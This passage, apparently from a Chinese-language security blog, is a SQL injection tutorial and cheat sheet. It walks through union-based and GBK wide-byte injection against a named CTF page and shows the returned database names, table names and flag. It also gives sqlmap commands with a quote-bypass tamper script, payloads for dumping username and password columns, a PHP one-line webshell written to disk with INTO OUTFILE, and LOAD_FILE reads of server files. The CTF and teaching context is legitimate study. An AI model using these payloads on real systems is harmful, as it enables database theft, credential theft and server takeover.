+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1,2&lt;/span&gt;,3,4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;看回显什么数字，就可以知道那个字段回显。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;查询数据库名版本用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询数据库名版本用户&#34;&gt;#&lt;/a&gt; 查询数据库名，版本，用户&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;,database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,3,4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.user&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;查询数据表-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询数据表-2&#34;&gt;#&lt;/a&gt; 查询数据表&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name from information_schema.tables where &lt;span class=&#34;token assign-left variable&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; from information_schema.tables where &lt;span class=&#34;token assign-left variable&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;查询字段-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询字段-2&#34;&gt;#&lt;/a&gt; 查询字段&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;,group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,3,4 from information_schema.columns where &lt;span class=&#34;token assign-left variable&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;你查询出来的表名&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;查询数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询数据&#34;&gt;#&lt;/a&gt; 查询数据&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;union selcet &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;,group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;要查询的字段1,字段2,&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;字段n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,3,4 from 数据表&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;select group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;字段&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; from 数据表&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,3,4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h1&gt;
+&lt;h2 id=&#34;宽字节注入产生的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入产生的原因&#34;&gt;#&lt;/a&gt; 宽字节注入产生的原因&lt;/h2&gt;
+&lt;p&gt;宽字节注入就是用一个大于 128 的十六进制数来吃掉转义符 ```&lt;/p&gt;
+&lt;p&gt;gbk 编码，用两个字节作为一个字符的编码.&lt;/p&gt;
+&lt;h2 id=&#34;宽字节注入的手工注入流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入的手工注入流程&#34;&gt;#&lt;/a&gt; 宽字节注入的手工注入流程&lt;/h2&gt;
+&lt;p&gt;1、判断列数：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; order by 1%23&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; order by 2%23&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; order by 3%23&lt;br /&gt;
+order by 3 时报错，说明只有两列。&lt;/p&gt;
+&lt;p&gt;2、各类信息：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; and 1=2&lt;br /&gt;
+union select 2,(concat_ws(char(32,58,32),user(),database(),version()))%23&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnNhZS1jaGluYWxvdmVyQDEyMy4xMjUuMjMuMjEy&#34;&gt;sae-chinalover@123.125.23.212&lt;/span&gt; : sae-chinalover : 5.5.52-0ubuntu0.14.04.1&lt;/p&gt;
+&lt;p&gt;3、库名：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; and 1=2 union select 2,database()%23&lt;br /&gt;
+sae-chinalover&lt;/p&gt;
+&lt;p&gt;4、表名：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; and 1=2&lt;br /&gt;
+union select 2,group_concat(table_name)&lt;br /&gt;
+from information_schema.tables&lt;br /&gt;
+where table_schema=database()%23&lt;br /&gt;
+ctf,ctf2,ctf3,ctf4,news&lt;/p&gt;
+&lt;p&gt;5、ctf4 表的列名：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; and 1=2&lt;br /&gt;
+union select 2,group_concat(column_name)&lt;br /&gt;
+from information_schema.columns&lt;br /&gt;
+where table_name=0x63746634%23&lt;br /&gt;
+id,flag&lt;/p&gt;
+&lt;p&gt;这里注意：要将表名 ctf4 转为 16 进制&lt;/p&gt;
+&lt;p&gt;这里提供一个字符串转 16 进制的网站：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy41aXh1ZXhpd2FuZy5jb20vc3RyL2hleC5waHA=&#34;&gt;http://www.5ixuexiwang.com/str/hex.php&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;转了 16 进制之后记得在前面加上 0x&lt;/p&gt;
+&lt;p this_is_sqli_flag=&#34;&#34;&gt;6、flag 列的数据：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�&#39;&lt;/span&gt; and 1=2&lt;br /&gt;
+union select 2,(select flag from ctf4)%23&lt;br /&gt;
+flag&lt;/p&gt;
+&lt;h2 id=&#34;使用sqlmap进行宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用sqlmap进行宽字节注入&#34;&gt;#&lt;/a&gt; 使用 SQLmap 进行宽字节注入&lt;/h2&gt;
+&lt;p&gt;sqlmap 跑法&lt;br /&gt;
+ 1、查看有哪些库：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3&lt;/span&gt;&amp;quot; --tamper unmagicquotes --dbs&lt;br /&gt;
+ 这个时侯就要用到一个脚本了：&lt;/p&gt;
+&lt;p&gt;脚本名：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3VubWFnaWNxdW90ZXMucHk=&#34;&gt;unmagicquotes.py&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;作用：宽字符绕过&lt;/p&gt;
+&lt;p&gt;2、表名：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3&lt;/span&gt;&amp;quot; --tamper unmagicquotes -D  &lt;code&gt;sae-chinalover&lt;/code&gt;  --tables&lt;/p&gt;
+&lt;p&gt;3、列名：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3&lt;/span&gt;&amp;quot; --tamper unmagicquotes -D  &lt;code&gt;sae-chinalover&lt;/code&gt;  -T ctf4 --columns&lt;/p&gt;
+&lt;p&gt;4、flag 列的数据：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3&lt;/span&gt;&amp;quot; --tamper unmagicquotes -D  &lt;code&gt;sae-chinalover&lt;/code&gt;  -T ctf4 -C flag&lt;/p&gt;
+&lt;h1 id=&#34;常用姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用姿势&#34;&gt;#&lt;/a&gt; 常用姿势&lt;/h1&gt;
+&lt;h2 id=&#34;判断是否存在sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断是否存在sql注入&#34;&gt;#&lt;/a&gt; 判断是否存在 SQL 注入&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;and &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;and &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;暴字段长度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴字段长度&#34;&gt;#&lt;/a&gt; 暴字段长度&lt;/h2&gt;
+&lt;p&gt;Order by 数字&lt;/p&gt;
+&lt;h2 id=&#34;匹配字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#匹配字段&#34;&gt;#&lt;/a&gt; 匹配字段&lt;/h2&gt;
+&lt;p&gt;and 1=1 union select 1,2,…,n&lt;/p&gt;
+&lt;h2 id=&#34;暴字段位置回显位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴字段位置回显位&#34;&gt;#&lt;/a&gt; 暴字段位置（回显位）&lt;/h2&gt;
+&lt;p&gt;and 1=2 union select 1,2,…,n&lt;/p&gt;
+&lt;h2 id=&#34;利用内置函数暴数据库信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用内置函数暴数据库信息&#34;&gt;#&lt;/a&gt; 利用内置函数暴数据库信息&lt;/h2&gt;
+&lt;p&gt;version() database() user()&lt;/p&gt;
+&lt;h2 id=&#34;不用猜解可用字段暴数据库信息有些网站不适用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不用猜解可用字段暴数据库信息有些网站不适用&#34;&gt;#&lt;/a&gt; 不用猜解可用字段暴数据库信息 (有些网站不适用):&lt;/h2&gt;
+&lt;p&gt;and 1=2 union all select version()&lt;br /&gt;
+and 1=2 union all select database()&lt;br /&gt;
+and 1=2 union all select user()&lt;/p&gt;
+&lt;h2 id=&#34;操作系统信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#操作系统信息&#34;&gt;#&lt;/a&gt; 操作系统信息：&lt;/h2&gt;
+&lt;p&gt;and 1=2 union all select @@global.version_compile_os from mysql.user&lt;/p&gt;
+&lt;h2 id=&#34;数据库权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库权限&#34;&gt;#&lt;/a&gt; 数据库权限：&lt;/h2&gt;
+&lt;p&gt;and ord (mid (user (),1,1))=114 返回正常说明为 root&lt;/p&gt;
+&lt;h2 id=&#34;暴库-mysql50&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴库-mysql50&#34;&gt;#&lt;/a&gt; 暴库 (mysql&amp;gt;5.0)&lt;/h2&gt;
+&lt;p&gt;Mysql 5 以上有内置库 information_schema，存储着 mysql 的所有数据库和&lt;br /&gt;
+表结构信息&lt;/p&gt;
+&lt;p&gt;and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from&lt;br /&gt;
+information_schema.SCHEMATA limit 0,1&lt;/p&gt;
+&lt;h2 id=&#34;猜表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#猜表&#34;&gt;#&lt;/a&gt; 猜表&lt;/h2&gt;
+&lt;p&gt;and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from&lt;br /&gt;
+information_schema.TABLES where TABLE_SCHEMA = 数据库（十六进制） limit 0（开始的记录，0 为第一个开始记录）,1（显示 1 条记录）—&lt;/p&gt;
+&lt;h2 id=&#34;猜字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#猜字段&#34;&gt;#&lt;/a&gt; 猜字段&lt;/h2&gt;
+&lt;p&gt;and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from&lt;br /&gt;
+information_schema.COLUMNS where TABLE_NAME = 表名（十六进制）limit 0,1&lt;/p&gt;
+&lt;h2 id=&#34;暴密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴密码&#34;&gt;#&lt;/a&gt; 暴密码&lt;/h2&gt;
+&lt;p&gt;and 1=2 Union select 1,2,3, 用户名段，5,6,7, 密码段，8,9 from 表名 limit 0,1 高级用法（一个可用字段显示两个数据内容）：&lt;br /&gt;
+Union select 1,2,3concat (用户名段，0x3c, 密码段),5,6,7,8,9 from 表名 limit 0,1&lt;/p&gt;
+&lt;h2 id=&#34;直接写马root权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#直接写马root权限&#34;&gt;#&lt;/a&gt; 直接写马 (Root 权限)&lt;/h2&gt;
+&lt;p&gt;条件：&lt;br /&gt;
+1、知道站点物理路径&lt;br /&gt;
+ 2、有足够大的权限（可以用 select …. from mysql.user 测试）&lt;br /&gt;
+3、magic_quotes_gpc()=OFF&lt;br /&gt;
+select ‘&lt;?php eval_r($_POST[cmd])?&gt;’ into outfile ‘物理路径’&lt;br /&gt;
+and 1=2 union all select 一句话 HEX 值 into outfile ‘路径’&lt;/p&gt;
+&lt;h2 id=&#34;文件读写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读写&#34;&gt;#&lt;/a&gt; 文件读写&lt;/h2&gt;
+&lt;p&gt;即通过数据库来读写服务器上的文件&lt;/p&gt;
+&lt;p&gt;LOAD_FILE(file_name)&lt;/p&gt;
+&lt;p&gt;其中 file_name 是文件的完整路径。&lt;/p&gt;
+&lt;p&gt;示例:&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;D:/wamp64/tmp/1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+----------------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;D:/wamp64/tmp/1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+----------------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;666&lt;/span&gt;                              &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+----------------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;select …… into outfile&lt;/p&gt;
+&lt;p&gt;outfile 函数可以导出多行，而 dumpfile 只能导出一行数据&lt;br /&gt;
+ outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式&lt;br /&gt;
+ outfile 函数会在写入的文件最后加一个换行，即多写一行&lt;/p&gt;
+&lt;p&gt;实例：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;aa&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;aaaa&#39;&lt;/span&gt; into outfile &lt;span class=&#34;token string&#34;&gt;&#39;d:/test1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Query OK, &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; row affected &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d:/test1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+---------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; load_file&lt;span class=&#34;token 